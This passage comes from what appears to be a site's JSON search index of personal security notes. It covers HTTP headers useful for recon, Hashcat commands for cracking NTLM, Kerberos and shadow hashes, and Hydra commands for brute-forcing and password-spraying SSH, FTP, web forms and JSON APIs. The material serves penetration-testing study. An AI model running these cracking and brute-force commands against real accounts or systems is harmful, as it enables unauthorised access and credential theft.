data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;http&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;GET&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt; / &lt;/span&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;HTTP&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt;1.1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;host:&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; something&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;(Note the blank line at the end.)&lt;/p&gt;\n&lt;h2 id=&quot;http-headers&quot;&gt;HTTP headers&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#http-headers&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; headers are (relatively) arbitrary. Common/Important ones to watch out for:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;Server — Web server information (Apache, NGINX, etc.); useful for recon.&lt;/li&gt;\n&lt;li&gt;True-Client-IP — Override the client IP address (direct connections to servers).&lt;/li&gt;\n&lt;li&gt;X-Forwarded-For — Override the client IP address (connections forwarded through proxies).&lt;/li&gt;\n&lt;li&gt;X-Powered-By — Added by some application engines to advertise themselves; useful for recon.&lt;/li&gt;\n&lt;li&gt;Content-Type — Specifies the body content; normally only set by the client for POST/PATCH requests (for example, form data uses application/x-www-form-urlencoded.&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/docs/Web/HTTP/Headers/Content-Length&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Content-Length&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; — The length of the body in bytes (which is just characters for ASCII) for POST requests.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;There are other headers (for example, Cookie), obviously. Arbitrary additional (non-standard) headers &lt;em&gt;should&lt;/em&gt; be X-prefixed, though there’s technically nothing stopping anyone from ignoring this convention/standard.&lt;/p&gt;"},"spells/Hashcat":{"slug":"spells/Hashcat","filePath":"spells/Hashcat.md","title":"Hashcat","links":["spells/NTLM-hashes","spells/Kerberos"],"tags":["Application/Hashcat","Application/Metasploit","AttackCycle/PrivEsc","Cryptography/Hashes/MD5","Cryptography/Hashes/SHA1","Cryptography/Hashes/MD4","Cryptography/Hashes/NT","Cryptography/Hashes/SHA256","Cryptography/Hashes/SHA512","Cryptography/Hashes/LANMAN","Cryptography/Hashes/bcrypt","Cryptography/Hashes/AS-REP","Cryptography/Hashes/TGS-REP","AttackCycle/Exploitation/AS-REPRoasting"],"content":"hashcat -m $TYPE -O $HASHFILE $WORDLIST\nHere $TYPE is the hash type (check man hashcat), and -O requests that Hashcat use an optimized kernel (faster, but limited in the password length that can be cracked). Note that instead of $HASHFILE, a raw hash can be provided directly instead (the hash-identifier tool on Kali Linux can help narrow down the kind of hash being dealt with in these situations).\nSome values of -m:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTypeHash0md5100sha1900md41000Windows NTLM hashes1400sha2561800UNIX SHA-512 passwords ($6$)3000LANMAN (Windows)3200bcrypt13100Kerberos 5 hashes (TGS-REP)18200Kerberos 5 hashes (AS-REP)\nThere are also a large number of “Raw Hash, Salted and/or Iterated” modes that allow raw salted hashes (i.e., those not specific to a particular password type) to be processed; for these, specify the hashes as $HASH:$SALT.\nPasswords are output as HASH:PLAINTEXT tuples.\nHashcat can accept the output of hashdump from Metasploit (use -m 1000), as well as raw hashes from /etc/shadow (assuming that they’re all the same type).\nA “token length exception” means that the provided hash format is of the wrong length (probably because an additional character got accidentally added).\nCombinator\nThe Hashcat combinator.bin utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.\n/usr/lib/hashcat-utils/combinator.bin \\\n\t$WORDLIST1 $WORDLIST2 &gt; $COMBINED_WORDLIST\nBrute force password guessing\nHashcat can also produce lists for brute forcing using the -a 3 flag. If no hash is provided, then a simple list will be produced.\n# Produce a list of 4-digit PINs\n#\nhashcat -a 3 ?d?d?d?d —stdout\n \n# Crack an MD5 hash of a 4-digit PIN using brute-forcing\n#\nhashcat -a 3 -m 0 $MD5_HASH ?d?d?d?d\nThe hashcat --help command will display all available character sets (the d in the above example).","richContent":"&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TYPE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -O&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $HASHFILE&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORDLIST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$TYPE&lt;/code&gt; is the hash type (check &lt;code&gt;man hashcat&lt;/code&gt;), and &lt;code&gt;-O&lt;/code&gt; requests that Hashcat use an optimized kernel (faster, but limited in the password length that can be cracked). Note that instead of &lt;code&gt;$HASHFILE&lt;/code&gt;, &lt;a href=&quot;https://security.stackexchange.com/questions/204977/hashcat-cracking-a-salted-sha256/204978#204978&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;a raw hash can be provided directly instead&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (the hash-identifier tool on Kali Linux can help narrow down the kind of hash being dealt with in these situations).&lt;/p&gt;\n&lt;p&gt;Some values of &lt;code&gt;-m&lt;/code&gt;:&lt;/p&gt;\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th align=&quot;right&quot;&gt;Type&lt;/th&gt;&lt;th align=&quot;left&quot;&gt;Hash&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;0&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;md5&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;100&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;sha1&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;900&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;md4&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;1000&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;Windows &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NTLM-hashes&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NTLM-hashes&quot;&gt;NTLM hashes&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;1400&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;sha256&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;1800&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;UNIX SHA-512 passwords (&lt;code&gt;$6$&lt;/code&gt;)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;3000&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;LANMAN (Windows)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;3200&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;bcrypt&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;13100&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; 5 hashes (TGS-REP)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align=&quot;right&quot;&gt;18200&lt;/td&gt;&lt;td align=&quot;left&quot;&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/Kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Kerberos&quot;&gt;Kerberos&lt;/a&gt; 5 hashes (AS-REP)&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n&lt;p&gt;There are also a large number of “Raw Hash, Salted and/or Iterated” modes that allow raw salted hashes (i.e., those not specific to a particular password type) to be processed; for these, specify the hashes as &lt;code&gt;$HASH:$SALT&lt;/code&gt;.&lt;/p&gt;\n&lt;p&gt;Passwords are output as HASH:PLAINTEXT tuples.&lt;/p&gt;\n&lt;p&gt;Hashcat can accept the output of hashdump from Metasploit (use &lt;code&gt;-m 1000&lt;/code&gt;), as well as raw hashes from /etc/shadow (assuming that they’re all the same type).&lt;/p&gt;\n&lt;p&gt;A “token length exception” means that the provided hash format is of the wrong length (probably because an additional character got accidentally added).&lt;/p&gt;\n&lt;h2 id=&quot;combinator&quot;&gt;Combinator&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#combinator&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The Hashcat combinator.bin utility combines two wordlists such that every entry of the first list is concatenated with every entry from the second list.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;/usr/lib/hashcat-utils/combinator.bin&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t$WORDLIST1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORDLIST2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $COMBINED_WORDLIST&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;h2 id=&quot;brute-force-password-guessing&quot;&gt;Brute force password guessing&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#brute-force-password-guessing&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;Hashcat can also produce lists for brute forcing using the &lt;code&gt;-a 3&lt;/code&gt; flag. If no hash is provided, then a simple list will be produced.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Produce a list of 4-digit PINs&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ?d?d?d?d&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; —stdout&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Crack an MD5 hash of a 4-digit PIN using brute-forcing&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hashcat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 3&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -m&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $MD5_HASH&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; ?d?d?d?d&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;The &lt;code&gt;hashcat --help&lt;/code&gt; command will display all available character sets (the &lt;code&gt;d&lt;/code&gt; in the above example).&lt;/p&gt;"},"spells/Hydra":{"slug":"spells/Hydra","filePath":"spells/Hydra.md","title":"Hydra","links":["spells/HTTP"],"tags":["Application/Hydra","AttackCycle/Exploitation/BruteForcing"],"content":"Hydra can actually brute-force remote services, though I have some skepticism about how useful this is in practice.\nBasics\nhydra -t 4 -l $USER_NAME -P $WORDLIST \\\n      -f $TARGET_IP_ADDRESS $SERVICE\nHere $SERVICE is “ssh”, “ftp”, etc. Note that “http” is not used directly; instead use “http-get-form”, “http-post-form”, etc.\n\n-f — Stop after the first successful match. Useful if you are just trying to brute-force a single username!\n-l — Specify the username whose password you want to brute force.\n-L — Specify a file listing of usernames (one per line) you want to brute force.\n-p — Specify the password you want to attempt. Most useful in conjunction with -L for password spraying attacks.\n-P — Specify a file listing of passwords (one per line) you want to brute force.\n-s — Use a non-default port for $SERVICE.\n-t — Specifies the number of threads (parallel connection attempts) that Hydra should make at any one time. By default, Hydra uses 16 threads, but many services don’t seem to play well with this; -t 4 is a much more sane value.\n-V — Verbose output. Use -vV for even more verbose output, or -d for debugging output.\n\nAttacks\nHTTP logins\nWhen using Hydra to brute force an HTTP login, additional syntax is required after the protocol specifier (http-get-form or http-post-form). The syntax for each type of request can be looked up using hydra $SERVICE -U; use the placeholders ^USER^ and ^PASS^ to substitute in the username and password guesses. Condition strings S= and F= are simple string matches in the returned data for a successful and failed login, respectively.\nSee the following section on using Hydra to attack JSON APIs for an example of what this looks like.\nJSON APIs\nHydra can be used to attack API endpoints that accept JSON (though apparently there can be some problems with the headers that are passed along):\nhydra -vV -f -l $USERNAME -P $PASSWORDLIST \\\n      $HOST http-post-form \\\n      $ENDPOINT:&quot;$TEMPLATE&quot;:F=&quot;$INVALID&quot;:H=&quot;Content-Type\\: application/json&quot;\nThe $TEMPLATE is basically the JSON request body with the special placeholders ^USER^ and ^PASS^ (colons escaped). $INVALID is a string that will appear for login failures (note that this string cannot contain a colon, but fortunately is a substring match). The H parameter at the end allows us to override specific headers (necessary because otherwise Hydra sends Content-Type: application/x-www-form-urlencoded).","richContent":"&lt;p&gt;Hydra can actually brute-force remote services, though I have some skepticism about how useful this is in practice.&lt;/p&gt;\n&lt;h2 id=&quot;basics&quot;&gt;Basics&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#basics&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $USER_NAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $WORDLIST&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;      -f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_IP_ADDRESS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $SERVICE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Here &lt;code&gt;$SERVICE&lt;/code&gt; is “ssh”, “ftp”, etc. Note that “http” is not used directly; instead use “http-get-form”, “http-post-form”, etc.&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-f&lt;/code&gt; — Stop after the first successful match. Useful if you are just trying to brute-force a single username!&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-l&lt;/code&gt; — Specify the username whose password you want to brute force.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-L&lt;/code&gt; — Specify a file listing of usernames (one per line) you want to brute force.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-p&lt;/code&gt; — Specify the password you want to attempt. Most useful in conjunction with &lt;code&gt;-L&lt;/code&gt; for password spraying attacks.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-P&lt;/code&gt; — Specify a file listing of passwords (one per line) you want to brute force.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-s&lt;/code&gt; — Use a non-default port for &lt;code&gt;$SERVICE&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-t&lt;/code&gt; — Specifies the number of threads (parallel connection attempts) that Hydra should make at any one time. By default, Hydra uses 16 threads, but many services don’t seem to play well with this; &lt;code&gt;-t 4&lt;/code&gt; is a much more sane value.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-V&lt;/code&gt; — Verbose output. Use &lt;code&gt;-vV&lt;/code&gt; for even more verbose output, or &lt;code&gt;-d&lt;/code&gt; for debugging output.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;attacks&quot;&gt;Attacks&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#attacks&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;http-logins&quot;&gt;HTTP logins&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#http-logins&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;When using Hydra to brute force an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/HTTP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/HTTP&quot;&gt;HTTP&lt;/a&gt; login, additional syntax is required after the protocol specifier (&lt;code&gt;http-get-form&lt;/code&gt; or &lt;code&gt;http-post-form&lt;/code&gt;). The syntax for each type of request can be looked up using &lt;code&gt;hydra $SERVICE -U&lt;/code&gt;; use the placeholders &lt;code&gt;^USER^&lt;/code&gt; and &lt;code&gt;^PASS^&lt;/code&gt; to substitute in the username and password guesses. Condition strings &lt;code&gt;S=&lt;/code&gt; and &lt;code&gt;F=&lt;/code&gt; are simple string matches in the returned data for a successful and failed login, respectively.&lt;/p&gt;\n&lt;p&gt;See the following section on using Hydra to attack JSON APIs for an example of what this looks like.&lt;/p&gt;\n&lt;h3 id=&quot;json-apis&quot;&gt;JSON APIs&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#json-apis&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;a href=&quot;https://security.stackexchange.com/questions/57839/hydra-bruteforce-and-json/57858#57858&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Hydra can be used to attack API endpoints that accept JSON&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; (though apparently there can be some problems with the headers that are passed along):&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; 